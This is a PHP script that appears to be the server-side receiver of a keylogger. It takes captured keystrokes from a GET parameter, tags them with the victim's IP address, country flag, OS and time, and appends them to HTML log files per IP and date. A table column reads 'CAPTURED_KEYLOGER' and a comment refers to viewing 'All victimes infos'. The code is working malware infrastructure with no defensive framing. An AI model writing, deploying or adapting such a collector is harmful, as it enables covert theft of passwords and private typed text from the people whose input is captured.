<?php

 
  include "geo/index.php";
    if($_GET){

        include 'geo/geoip.inc';
        include 'os.php'; 


        $gi = geoip_open("geo/GeoIP.dat", "");

        $ip = $_SERVER['REMOTE_ADDR'] ;
        $date = new DateTime("now", new DateTimeZone('Africa/Dakar') ); //SET YOUR DATETIMEZONE HERE
        $d =  $date->format('d/m/Y H:i:s');
        $country = geoip_country_id_by_addr($gi, $ip); 

        
        $flag = '<img src="../../../geo/img/flags/'.strtolower(geoip_country_code_by_addr($gi,$ip)).'.png">';

        $log = $_GET['values'];
        $user_os        = getOS(); 

         $curDate   = date("d-m-Y");

        $directory = "logs/" . $ip . "/" . $curDate;
        $myfile   = $directory . "/" . $ip . ".html";
  // Create logs dir if it not exists
      if (!file_exists($directory)) {
       mkdir($directory, 0777, true);
      } 
        
        
          $txt = '
         <!DOCTYPE html>
<html>
<head>
  <style>
     
    .box1D {
        border-radius:5px 5px 5px 5px;
        transition: box-shadow 0.2s;
    }
      .box1D:hover {
        box-shadow: 3px 3px 3px 3px #000;
        border:solid 0.5px #fff;
        border-radius: 10px;
    }

    .box2D {
        border-radius:5px 5px 5px 5px;
        transition: box-shadow 0.2s;
    }
      .box2D:hover {
        box-shadow: 3px 3px 3px 3px #000;
        border:solid 0.5px #fff;
        border-radius: 10px;
    }

  </style>
  <title>view_logs</title>
    <link rel="stylesheet" href="../../../bootstrap/css/bootstrap.min.css">
</head>
<body width="600">
    <script src="../../../bootstrap/js/jquery-3.2.1.slim.min.js"></script>
    <script src="../../../bootstrap/js/popper.min.js"></script>
    <script src="../../../bootstrap/js/bootstrap.min.js"></script>
<table class="table table-striped" border="1">
  <thead class="thead-dark">
    <tr>
      <th>IP_DATE_HEURE</th>
      <th>CAPTURED_KEYLOGER</th>
    </tr>
  </thead>
  <tbody>

          <tr> <th scope="row">'
          .$ip.'<br>'.$geoplugin->countryName.'&nbsp;'.$flag.''.$d.'<br>'.$user_os.'</th> 

          <td width="100%" class="box3D"> '.$log.' 

          </td> </tr>';

        // myfille2 is to display All victimes infos see login page

        $myfile = fopen($myfile, "a") or die("Unable to open file!");

        fwrite($myfile, $txt);
        fclose($myfile);

    }

?>